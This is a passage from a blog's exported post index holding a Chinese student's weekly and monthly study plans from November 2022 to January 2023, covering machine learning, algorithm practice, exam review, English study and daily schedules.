<li>同时会有一个问题就是，如果一天同时进行多项学习任务，会导致任务的完成时间会被拉长，如果一些事情打断，就会打断学习的连续性</li>
<li>但同时是会有一个问题，就是一个学科学太久了会有大脑疲劳</li>
</ul>
</li>
</ol>
<ul>
<li>思考一下，如何做复盘笔记，老是忘了做，或者完不成计划的任务</li>
<li>要想一下设备的管理</li>
<li>懂得了自己到底要学些什么，要走什么方向知道自己未来的规划是什么</li>
<li>思考如何进行复盘<ul>
<li>要每天进行记录自己的学习状况，来改进自己的学习方法<ul>
<li>什么时间复盘	</li>
<li>复盘的内容是什么</li>
<li>准备好复盘的条件</li>
<li>还有内容放在哪里，毕竟日积月累内容也挺大</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="本月重点"><a href="#本月重点" class="headerlink" title="本月重点"></a>本月重点</h2><ul>
<li>确定研究方向<ul>
<li>看研究方向至少10篇以上的论文</li>
</ul>
</li>
<li>专注与机器学习</li>
</ul>
<h2 id="Subject-to-Arrange"><a href="#Subject-to-Arrange" class="headerlink" title="Subject to Arrange"></a>Subject to Arrange</h2><h3 id="计算机专业知识"><a href="#计算机专业知识" class="headerlink" title="计算机专业知识"></a>计算机专业知识</h3><ul>
<li>机器学习看完<ul>
<li>了解大部分算法的原理</li>
<li>学会如何使用这些算法</li>
<li>还要学会如何调整参数</li>
</ul>
</li>
<li>计算机网络打算等假期在看<ul>
<li>操作系统看看有没有时间搞</li>
<li>在此之前还要把数据库学完</li>
</ul>
</li>
<li>要开始做研究，</li>
<li>要开始每天刷算法题<ul>
<li>这个月的任务是刷完贪心算法题目</li>
<li>如果还是时间的话，可以刷一下之前没来得及刷的题目，如哈希表，二叉树</li>
<li>下个月的任务是动态规划</li>
</ul>
</li>
</ul>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ul>
<li>打算以退为进。</li>
<li>反正我现在有没四六级考试，而且四六级阅读是那种技巧性很强的，需要考前一两个月进行突击，我打算把时间省下来，用来看英语文献</li>
<li>现在就只要完成每天复习的单词就行了</li>
</ul>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li>开始学习数学建模<ul>
<li>这次要调整一下学习方向</li>
<li>要专注于自己研究方向可能会用到的技术学习<ul>
<li>机器学习</li>
<li>数据的预处理</li>
<li>特征工程</li>
</ul>
</li>
<li>还要定期的看优秀论文<ul>
<li>并且还要和组员进行讨论</li>
</ul>
</li>
</ul>
</li>
<li>等机器学习学完还有数模的基本内容学完<ul>
<li>要开始看考研的概率论，刷题</li>
<li>还要开始复习大一的数学，要准备数学竞赛</li>
</ul>
</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><ul>
<li>本月暂时放弃软件方面的学习</li>
</ul>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2022.11.weekly.2nd</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2022.11.weekly.2nd/</url>
    <content><![CDATA[<h1 id="十一月第二周计划"><a href="#十一月第二周计划" class="headerlink" title="十一月第二周计划"></a>十一月第二周计划</h1><p>2022.11.14~2022.11.20</p>
<h2 id="上周复盘"><a href="#上周复盘" class="headerlink" title="上周复盘"></a>上周复盘</h2><ul>
<li><p>要养成一个一个的习惯 </p>
</li>
<li><p>感觉第二天把前一天学习的内容复习一遍，学习效果更好</p>
</li>
<li><p>总结出一个学习经验就是每天要给出明确的任务量 </p>
<ul>
<li>比如一天刷一道有难度的算法题</li>
</ul>
</li>
<li><p>还有就是到底要不要有日总结 </p>
<ul>
<li>要有可以在10:40——11:00 进行书写</li>
<li>要一步步缩短时间，避免浪费太多时间</li>
</ul>
</li>
<li><p>上周在比赛上浪费的时间有点多 </p>
</li>
<li><p>但是已经养成的刷算法题的习惯 </p>
<ul>
<li>算法的学习已经步入正轨</li>
</ul>
</li>
<li><h2 id="英语的学习还没有起色"><a href="#英语的学习还没有起色" class="headerlink" title="英语的学习还没有起色 "></a>英语的学习还没有起色 </h2></li>
<li><p>一周的时间里面需要抓住1~2个重要事件 </p>
</li>
<li><p>要重新制定新的作息计划<br>下午	做事情<br>晚上	看视屏</p>
</li>
</ul>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>开始研究机器学习</li>
<li>准备新的数学建模比赛</li>
<li>掌握一下新的处理数据的方法</li>
</ol>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><ol>
<li>要开始选择研究的门派</li>
<li>况昆</li>
<li>还要开始图片识别领域的学习</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>养成每天刷算法题的习惯</li>
<li>代码随想录做到第十章</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ul>
<li>单词不在继续背了</li>
<li>感觉已经背的差不多了</li>
<li>要养成每天学习英语的习惯</li>
<li>现在就在思考英语单词什么时候背</li>
<li>每天一套阅读</li>
<li>思考如何平衡做题和背单词</li>
</ul>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ol>
<li>概率论完成一轮复习 <ol>
<li>把课后习题的基础题都做过一遍</li>
</ol>
</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
<li>学习使用jupyer notebook 用于机器学习</li>
<li>有时间要把MySQL学习一下</li>
<li>把数学建模会用到的机器学习算法整理一下</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>校运动会</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2022.12.1st.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2022.12.1st.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2022-11-第一周计划"><a href="#2022-11-第一周计划" class="headerlink" title="2022.11.第一周计划"></a>2022.11.第一周计划</h1><p>2022.12.5~2022.12.12</p>
<h2 id="上周复盘"><a href="#上周复盘" class="headerlink" title="上周复盘"></a>上周复盘</h2><ol>
<li>不能牺牲睡眠时间来学习<ol>
<li>应该想如何增加自己的学习效率</li>
</ol>
</li>
<li>思考一下学习计划的问题</li>
<li>重新分配了学习计划<ol>
<li>感觉花在科研上的时间很少</li>
<li>学校的内容总是安排的没有头绪</li>
<li>导致自己的学习任务也要被牵制</li>
</ol>
</li>
<li>思考是看书学习更好还是看视频学习更好</li>
<li>晚上回去就几乎没有进行学习任务</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>先把一些欠下的任务完成</li>
<li>还有解决掉一下欠下的任务</li>
<li>要开始期末复习<ol>
<li>目前是放在晚上进行</li>
</ol>
</li>
</ol>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><ol>
<li>要注重论文的阅读<ol>
<li>要掌握一个论文的阅读方法</li>
<li>目前先暂停，感觉时间不够用了</li>
</ol>
</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>算法方面<ol>
<li>动态规划题目</li>
<li>还要趁着头哥作业复习一下数据结构</li>
</ol>
</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>现在也没有想好英语要怎么学习<ol>
<li>可能就先恢复一下常态</li>
<li>背单词</li>
</ol>
</li>
<li>现在就先专心准备期末考试<ol>
<li>期末考试也不是很着急</li>
<li>因为这个期末考试的复习，没什么选择题，要背。而我的学习比较依靠电脑打字来加深记忆</li>
</ol>
</li>
<li>准备英语期末考试<ol>
<li>重新整理一下期末考试提纲</li>
<li>英语听力、阅读</li>
<li>这个最后看看有没有时间突击一下</li>
<li>先把翻译和选词填空先背了</li>
</ol>
</li>
</ol>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><input disabled="" type="checkbox"> 准备一下概率论就行了</li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
<li><input disabled="" type="checkbox"> 要开始复习java了</li>
<li><input disabled="" type="checkbox"> 复习Java</li>
<li><input disabled="" type="checkbox"> 如果有时间要提前学习一下MySQL</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<ol start="2">
<li>要开始复习数字逻辑了<ol>
<li>不然考试都不会做</li>
</ol>
</li>
</ol>
<ul>
<li>准备政治期末考试</li>
<li><input disabled="" type="checkbox"> 每天一遍非填空题</li>
<li><input disabled="" type="checkbox"> 开始背简答题和论述题</li>
</ul>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h3><ol>
<li>对付一下学校课程</li>
<li>数学<ol>
<li>主要刷题</li>
<li>不断掌握刷题技巧</li>
<li>不在进行新的学习</li>
</ol>
</li>
<li>要应付一下学校的其他任务</li>
<li>英语<ol>
<li>背单词</li>
<li>刷四级真题</li>
</ol>
</li>
</ol>
<h3 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h3><ul>
<li>刷算法题</li>
</ul>
<h3 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h3><ol>
<li>目前的计划是进行计算机的学习<ol>
<li>可以是计算机底层的学习<ol>
<li>如数据结构、操作系统</li>
</ol>
</li>
<li>也可以是代码方面<ol>
<li>如前端、后端、</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h3><ol>
<li>科研方面的学习</li>
<li>还有数学建模的学习</li>
<li>晚上的学习更加偏向看书一点</li>
<li>复习期末考试</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>时间规划<ol>
<li>一回去先不着急洗澡</li>
</ol>
</li>
<li>睡眠时间<ol>
<li>12:30 - 7:30</li>
<li>7小时</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2022.12.2nd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2022.12.2nd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2022-12-第二周计划"><a href="#2022-12-第二周计划" class="headerlink" title="2022.12.第二周计划"></a>2022.12.第二周计划</h1><p>2022.12.12~2022.12.18</p>
<h2 id="上周复盘"><a href="#上周复盘" class="headerlink" title="上周复盘"></a>上周复盘</h2><ol>
<li>不能牺牲睡眠时间来学习<ol>
<li>应该想如何增加自己的学习效率</li>
<li>而且最近身体感觉也快熬不住</li>
</ol>
</li>
<li>思考一下学习计划的问题</li>
<li>重新分配了学习计划<ol>
<li>感觉花在科研上的时间很少</li>
<li>学校的内容总是安排的没有头绪</li>
<li>导致自己的学习任务也要被牵制</li>
</ol>
</li>
<li>思考是看书学习更好还是看视频学习更好</li>
<li>晚上回去就几乎没有进行学习任务</li>
<li>思考一下发现其实学校关于计算机的课程其实没有必要全部都学<ol>
<li>就比如硬件方向，我不感兴趣，也不想走这个方向</li>
<li>还有离散我走的方向也用不到这个，</li>
<li>可以用到的时候再学</li>
</ol>
</li>
<li>要思考一下学习方向<ol>
<li>想一下这个内容值不值的学习</li>
<li>如果是学校课程要想一想如何应付期末考试</li>
</ol>
</li>
<li>周计划<ol>
<li>想来一下还是要把周进行拆分<ol>
<li>比如周日做什么</li>
<li>周六做什么</li>
<li>还有工作日做什么</li>
</ol>
</li>
<li>日计划可以不用在承担个人思考的部分<ol>
<li>可以放到周计划中，作为下周执行</li>
<li>同时周日没什么事情，可以认真的思考一下，这样想的会更加周全一点</li>
</ol>
</li>
<li>日计划的昨日总结就记录一下，这一天都做了什么</li>
</ol>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>课程设计</li>
<li>英语翻译背完</li>
<li>政治大题背完</li>
<li>把java选择题背完</li>
</ol>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><ol>
<li>要注重论文的阅读<ol>
<li>要掌握一个论文的阅读方法</li>
<li>目前先暂停，感觉时间不够用了</li>
</ol>
</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>算法方面<ol>
<li>动态规划题目</li>
<li>还要趁着头哥作业复习一下数据结构</li>
</ol>
</li>
<li>暂时停止</li>
<li>课设</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>单词动态清零</li>
<li>复习之前背的选词填空</li>
<li>把翻译背完</li>
<li>把听力和阅读整理进去</li>
</ol>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><input disabled="" type="checkbox"> 准备一下概率论就行了</li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
<li><input disabled="" type="checkbox"> java 直接背题库</li>
<li><input disabled="" type="checkbox"> 如果有时间要提前学习一下MySQL</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<ol start="2">
<li>要开始复习数字逻辑了<ol>
<li>不然考试都不会做</li>
</ol>
</li>
</ol>
<ul>
<li>准备政治期末考试</li>
<li><input disabled="" type="checkbox"> 每天一遍非填空题</li>
<li><input disabled="" type="checkbox"> 开始背简答题和论述题</li>
</ul>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h3><ol>
<li>巩固之前背过的期末考试提纲</li>
<li>单词动态清零</li>
</ol>
<h3 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h3><ol>
<li>背新的内容</li>
</ol>
<h3 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h3><ol>
<li>完成学校的课程作业</li>
</ol>
<h3 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h3><ol>
<li>自由时间</li>
<li>可以复习考试</li>
<li>可以学习新的内容</li>
<li>可以搞科研</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>时间规划</li>
<li>睡眠时间<ol>
<li>12:30 - 7:30</li>
<li>7小时</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2022.12.3rd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2022.12.3rd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2022-12-第三周计划"><a href="#2022-12-第三周计划" class="headerlink" title="2022.12.第三周计划"></a>2022.12.第三周计划</h1><p>2022.12.19~2022.12.25</p>
<h2 id="上周复盘"><a href="#上周复盘" class="headerlink" title="上周复盘"></a>上周复盘</h2><ol>
<li>不能牺牲睡眠时间来学习<ol>
<li>应该想如何增加自己的学习效率</li>
<li>而且最近身体感觉也快熬不住</li>
</ol>
</li>
<li>思考一下学习计划的问题</li>
<li>重新分配了学习计划<ol>
<li>感觉花在科研上的时间很少</li>
<li>学校的内容总是安排的没有头绪</li>
<li>导致自己的学习任务也要被牵制</li>
</ol>
</li>
<li>思考是看书学习更好还是看视频学习更好</li>
<li>晚上回去就几乎没有进行学习任务</li>
<li>思考一下发现其实学校关于计算机的课程其实没有必要全部都学<ol>
<li>就比如硬件方向，我不感兴趣，也不想走这个方向</li>
<li>还有离散我走的方向也用不到这个，</li>
<li>可以用到的时候再学</li>
</ol>
</li>
<li>要思考一下学习方向<ol>
<li>想一下这个内容值不值的学习</li>
<li>如果是学校课程要想一想如何应付期末考试</li>
</ol>
</li>
<li>周计划<ol>
<li>想来一下还是要把周进行拆分<ol>
<li>比如周日做什么</li>
<li>周六做什么</li>
<li>还有工作日做什么</li>
</ol>
</li>
<li>日计划可以不用在承担个人思考的部分<ol>
<li>可以放到周计划中，作为下周执行</li>
<li>同时周日没什么事情，可以认真的思考一下，这样想的会更加周全一点</li>
</ol>
</li>
<li>日计划的昨日总结就记录一下，这一天都做了什么</li>
</ol>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>课程设计</li>
<li>英语翻译背完</li>
<li>政治大题背完</li>
<li>把java选择题背完</li>
</ol>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><ol>
<li>要注重论文的阅读<ol>
<li>要掌握一个论文的阅读方法</li>
<li>目前先暂停，感觉时间不够用了</li>
</ol>
</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>算法方面<ol>
<li>动态规划题目</li>
<li>还要趁着头哥作业复习一下数据结构</li>
</ol>
</li>
<li>暂时停止</li>
<li>课设</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>单词动态清零</li>
<li>复习之前背的选词填空</li>
<li>把翻译背完</li>
<li>把听力和阅读整理进去</li>
</ol>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><input disabled="" type="checkbox"> 准备一下概率论就行了</li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
<li><input disabled="" type="checkbox"> java 直接背题库</li>
<li><input disabled="" type="checkbox"> 如果有时间要提前学习一下MySQL</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<ol start="2">
<li>要开始复习数字逻辑了<ol>
<li>不然考试都不会做</li>
</ol>
</li>
</ol>
<ul>
<li>准备政治期末考试</li>
<li><input disabled="" type="checkbox"> 每天一遍非填空题</li>
<li><input disabled="" type="checkbox"> 开始背简答题和论述题</li>
</ul>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h3><ol>
<li>巩固之前背过的期末考试提纲</li>
<li>单词动态清零</li>
</ol>
<h3 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h3><ol>
<li>背新的内容</li>
</ol>
<h3 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h3><ol>
<li>完成学校的课程作业</li>
</ol>
<h3 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h3><ol>
<li>自由时间</li>
<li>可以复习考试</li>
<li>可以学习新的内容</li>
<li>可以搞科研</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>时间规划</li>
<li>睡眠时间<ol>
<li>12:30 - 7:30</li>
<li>7小时</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2022.12.4nd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2022.12.4nd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2022-11-第一周计划"><a href="#2022-11-第一周计划" class="headerlink" title="2022.11.第一周计划"></a>2022.11.第一周计划</h1><p>2022.12.5~2022.12.12</p>
<h2 id="上周复盘"><a href="#上周复盘" class="headerlink" title="上周复盘"></a>上周复盘</h2><ol>
<li>不能牺牲睡眠时间来学习<ol>
<li>应该想如何增加自己的学习效率</li>
</ol>
</li>
<li>思考一下学习计划的问题</li>
<li>重新分配了学习计划<ol>
<li>感觉花在科研上的时间很少</li>
<li>学校的内容总是安排的没有头绪</li>
<li>导致自己的学习任务也要被牵制</li>
</ol>
</li>
<li>思考是看书学习更好还是看视频学习更好</li>
<li>晚上回去就几乎没有进行学习任务</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>先把一些欠下的任务完成</li>
<li>还有解决掉一下欠下的任务</li>
<li>要开始期末复习<ol>
<li>目前是放在晚上进行</li>
</ol>
</li>
</ol>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><ol>
<li>要注重论文的阅读<ol>
<li>要掌握一个论文的阅读方法</li>
<li>目前先暂停，感觉时间不够用了</li>
</ol>
</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>算法方面<ol>
<li>动态规划题目</li>
<li>还要趁着头哥作业复习一下数据结构</li>
</ol>
</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>现在也没有想好英语要怎么学习<ol>
<li>可能就先恢复一下常态</li>
<li>背单词</li>
</ol>
</li>
<li>现在就先专心准备期末考试<ol>
<li>期末考试也不是很着急</li>
<li>因为这个期末考试的复习，没什么选择题，要背。而我的学习比较依靠电脑打字来加深记忆</li>
</ol>
</li>
<li>准备英语期末考试<ol>
<li>重新整理一下期末考试提纲</li>
<li>英语听力、阅读</li>
<li>这个最后看看有没有时间突击一下</li>
<li>先把翻译和选词填空先背了</li>
</ol>
</li>
</ol>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><input disabled="" type="checkbox"> 准备一下概率论就行了</li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
<li><input disabled="" type="checkbox"> 要开始复习java了</li>
<li><input disabled="" type="checkbox"> 复习Java</li>
<li><input disabled="" type="checkbox"> 如果有时间要提前学习一下MySQL</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<ol start="2">
<li>要开始复习数字逻辑了<ol>
<li>不然考试都不会做</li>
</ol>
</li>
</ol>
<ul>
<li>准备政治期末考试</li>
<li><input disabled="" type="checkbox"> 每天一遍非填空题</li>
<li><input disabled="" type="checkbox"> 开始背简答题和论述题</li>
</ul>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h3><ol>
<li>对付一下学校课程</li>
<li>数学<ol>
<li>主要刷题</li>
<li>不断掌握刷题技巧</li>
<li>不在进行新的学习</li>
</ol>
</li>
<li>要应付一下学校的其他任务</li>
<li>英语<ol>
<li>背单词</li>
<li>刷四级真题</li>
</ol>
</li>
</ol>
<h3 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h3><ul>
<li>刷算法题</li>
</ul>
<h3 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h3><ol>
<li>目前的计划是进行计算机的学习<ol>
<li>可以是计算机底层的学习<ol>
<li>如数据结构、操作系统</li>
</ol>
</li>
<li>也可以是代码方面<ol>
<li>如前端、后端、</li>
</ol>
</li>
</ol>
</li>
</ol>
<h3 id="晚上"><a href="#晚上" class="headerlink" title="晚上"></a>晚上</h3><ol>
<li>科研方面的学习</li>
<li>还有数学建模的学习</li>
<li>晚上的学习更加偏向看书一点</li>
<li>复习期末考试</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>时间规划<ol>
<li>一回去先不着急洗澡</li>
</ol>
</li>
<li>睡眠时间<ol>
<li>12:30 - 7:30</li>
<li>7小时</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2022.12.MonthlyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2022.12.MonthlyPlan/</url>
    <content><![CDATA[<h1 id="2022-12月计划"><a href="#2022-12月计划" class="headerlink" title="2022.12月计划"></a>2022.12月计划</h1><h2 id="上月总结"><a href="#上月总结" class="headerlink" title="上月总结"></a>上月总结</h2><h2 id="本月重点"><a href="#本月重点" class="headerlink" title="本月重点"></a>本月重点</h2><ul>
<li>复习期末考试</li>
<li></li>
</ul>
<h2 id="Subject-to-Arrange"><a href="#Subject-to-Arrange" class="headerlink" title="Subject to Arrange"></a>Subject to Arrange</h2><h3 id="计算机专业知识"><a href="#计算机专业知识" class="headerlink" title="计算机专业知识"></a>计算机专业知识</h3><ul>
<li>机器学习看完 <ul>
<li>了解大部分算法的原理</li>
<li>学会如何使用这些算法</li>
<li>还要学会如何调整参数</li>
</ul>
</li>
<li>计算机网络打算等假期在看 <ul>
<li>操作系统看看有没有时间搞</li>
<li>在此之前还要把数据库学完</li>
</ul>
</li>
<li>要开始做研究，</li>
</ul>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ul>
<li>只要把大学英语的期末考试应付了就行了</li>
<li></li>
</ul>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li>要开始概率论的期末复习</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><ul>
<li>要开始java的复习</li>
<li>可能还要做java的实验</li>
</ul>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.01.1st.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.01.1st.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-01-第一周计划"><a href="#2023-01-第一周计划" class="headerlink" title="2023.01.第一周计划"></a>2023.01.第一周计划</h1><h2 id="上周复盘"><a href="#上周复盘" class="headerlink" title="上周复盘"></a>上周复盘</h2><ol>
<li><p>要开始学习了</p>
</li>
<li><p>我觉的要重新思考一下「不背单词」的定位了</p>
<ol>
<li>感觉现在就主要是复习单词有点浪费时间</li>
<li>而且要复习完这些单词至少要1个半小时</li>
<li>思考几个问题<ol>
<li>什么时候背</li>
<li>背什么</li>
<li>怎么背</li>
<li></li>
</ol>
</li>
</ol>
</li>
<li><p>还有娱乐方式问题</p>
<ol>
<li>最近一直沉迷于B站</li>
<li>感觉是</li>
</ol>
</li>
<li><p>要思考一下如何管理电子设备</p>
<ol>
<li>感觉可以这个设备管理也要分时段</li>
<li>平板用来娱乐</li>
<li>现在电脑就只能用来学习和工作，不能用来娱乐</li>
<li>手机就进行一些生活方面的工作</li>
</ol>
</li>
<li><p>还有就是如何处理摸鱼的时间</p>
<ol>
<li>就是如何调节学习疲惫的时间</li>
<li></li>
</ol>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><p>1. </p>
<h3 id="科研"><a href="#科研" class="headerlink" title="科研"></a>科研</h3><p>1. </p>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>算法方面<ol>
<li>动态规划题目</li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><p>1. </p>
<h3 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h3><ul>
<li><input disabled="" type="checkbox"> </li>
</ul>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ul>
<li><input disabled="" type="checkbox"> </li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午"><a href="#上午" class="headerlink" title="上午"></a>上午</h3><ol>
<li>对付一下学校课程</li>
<li>数学<ol>
<li>主要刷题</li>
<li>不断掌握刷题技巧</li>
<li>不在进行新的学习</li>
</ol>
</li>
<li>要应付一下学校的其他任务</li>
<li>英语<ol>
<li>背单词</li>
<li>刷四级真题</li>
</ol>
</li>
</ol>
<h3 id="中午"><a href="#中午" class="headerlink" title="中午"></a>中午</h3><ul>
<li>刷算法题</li>
</ul>
<h3 id="下午"><a href="#下午" class="headerlink" title="下午"></a>下午</h3><ol>
